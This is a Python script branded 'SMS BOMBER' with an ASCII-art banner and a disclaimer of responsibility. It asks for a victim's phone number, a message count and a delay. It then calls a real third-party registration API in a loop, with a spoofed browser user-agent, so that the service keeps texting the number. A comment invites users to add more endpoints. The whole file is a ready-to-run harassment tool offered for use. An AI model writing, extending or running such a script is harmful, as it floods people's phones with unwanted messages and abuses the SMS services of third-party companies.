#!/usr/bin/env python3
import requests
import time
import os
import platform

def clear_screen():
    if platform.system().lower() == "windows":
        os.system("cls")
    else:
        os.system("clear")

def banner():
    clear_screen()
    print("""
  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                    
                                   By : D3XBugg3R                                                                                                 
    Note : I won't be responsible for any damage caused by this script, Use at your own risk
""")

def send_sms(phone, count, delay):
    # List of endpoints – you can add more here
    urls = [
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=",
        # Add more endpoints in the same format
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding': 'none',
        'Accept-Language': 'en-US,en;q=0.8',
        'Connection': 'keep-alive'
    }

    for i in range(count):
        for url in urls:
            full_url = url + phone
            try:
                response = requests.get(full_url, headers=headers, timeout=10)
                if response.status_code == 200:
                    print(f"[{i+1}/{count}] {url} → Success (HTTP {response.status_code})")
                else:
                    print(f"[{i+1}/{count}] {url} → Failed (HTTP {response.status_code})")
            except Exception as e:
                print(f"[{i+1}/{count}] {url} → Error: {str(e)}")
        time.sleep(delay)

def main():
    try:
        banner()
        phone = input("Enter mobile number (without +): ").strip()
        count = int(input("Enter number of messages per endpoint: "))
        delay = float(input("Enter delay between cycles (seconds): "))
        send_sms(phone, count, delay)
    except KeyboardInterrupt:
        print("\nStopped by user.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
